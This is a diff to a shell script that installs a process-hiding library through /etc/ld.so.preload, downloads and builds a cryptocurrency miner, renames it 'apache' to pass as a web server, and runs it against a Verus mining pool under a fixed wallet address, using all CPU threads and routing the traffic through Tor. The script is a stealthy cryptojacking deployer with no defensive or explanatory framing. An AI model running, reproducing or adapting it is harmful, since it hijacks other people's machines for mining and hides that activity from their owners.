@@ -1,6 +1,6 @@
 #!/bin/sh
 sudo apt update
-sudo apt install nano tor proxychains -y 
+sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential nano tor proxychains git -y
 sudo service tor start
 
 git clone https://github.com/hanifgz/libprocesshider.git
@@ -11,11 +11,15 @@ sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libpr
 cd ..
 sudo rm libprocesshider -r
 
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-rm hellminer_cpu_linux.tar.gz
-mv hellminer apache
+git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+mv ccminer ../apache
+cd ..
 
 sleep 5
 
-sudo proxychains ./apache -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$(echo $(shuf -i 1-1000 -n 1))  -p x --cpu $(echo $(nproc --all))
+./apache -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$(echo $(shuf -i 1-1000 -n 1)) -p x -t $(echo $(nproc --all)) --proxy socks5://127.0.0.1:9050
